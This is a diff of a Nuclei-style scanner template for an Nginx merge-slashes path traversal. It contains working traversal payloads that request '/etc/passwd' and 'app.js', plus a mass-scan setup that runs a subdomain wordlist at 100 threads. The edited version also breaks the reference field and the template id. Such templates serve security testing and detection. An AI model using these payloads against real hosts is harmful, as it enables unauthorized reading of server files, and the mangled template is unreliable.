@@ -1,40 +1,44 @@
-id: nginx-merge-slashes-path-traversal
-
+id: nginx-merge-slashes-path-traversal 3
 info:
-  name: Nginx Server - Local File Inclusion
   author: dhiyaneshDk
-  severity: high
-  description: Nginx server is vulnerable to local file inclusion.
-  reference:
-    - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+  name: Nginx Merge Slashes Path Traversal
+  reference: '- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+
     - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  metadata:
-    max-request: 3
+
+    '
+  severity: medium
   tags: exposure,config,lfi,nginx
+requests:
+- attack: sniper
+  matchers:
+  - condition: or
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - app.listen
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET ////../app.js HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}///////../../../etc/passwd"
-      - "{{BaseURL}}/static///////../../../../etc/passwd"
-      - "{{BaseURL}}///../app.js"
+    Host: {{Subdomains}}
 
-    stop-at-first-match: true
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
+    Firefox/65.0
 
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-          - "app.listen"
-        part: body
-        condition: or
+    Connection: close
 
-      - type: status
-        status:
-          - 200
-# digest: 4a0a004730450220379e33c7c64333545dda45d56c465054618bf6f8997a8db6bbb5b130474ca4e0022100914e174e684e555faff0601762d31b0de0166ed981fdc7af343e8c5273e09640:922c64590222798bb761d5b6d8e72950
+    Accept: */*
+
+    Accept-Language: en
+
+    Accept-Encoding: gzip
+
+    '
+  threads: 100
